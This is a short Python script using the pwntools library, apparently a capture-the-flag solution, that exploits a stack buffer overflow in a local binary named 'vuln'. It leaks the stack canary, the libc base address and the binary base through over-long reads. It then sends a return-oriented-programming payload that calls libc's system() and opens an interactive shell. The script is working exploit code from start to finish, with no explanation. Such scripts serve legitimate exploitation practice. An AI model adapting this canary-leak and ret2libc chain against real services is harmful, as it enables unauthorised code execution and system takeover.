from pwn import *
libc=ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
p=process('./vuln')
context.arch='amd64'

p.recv()
p.send(b'a'*41)
canary=u64(b'\x00'+p.recvuntil(b'\n')[-14:-7])
log.info(f"canary: {hex(canary)}")

p.send(b'a'*56)
libc.address=u64(p.recvuntil(b'\n')[-7:-1]+b'\x00\x00')-0x29ca8
log.info(f"libc: {hex(libc.address)}")

p.send(b'a'*72)
binary=u64(p.recvuntil(b'\n')[-7:-1]+b'\x00\x00')-0x1159
log.info(f"binary: {hex(binary)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = flat(
    b'\x00'*40,
    p64(canary),
    p64(0),
    p64(pop_rdi),
    p64(binary+0x2008),
    p64(pop_rdi+1),
    libc.sym['system']
)
p.send(payload) 
p.shutdown('send')
p.interactive()
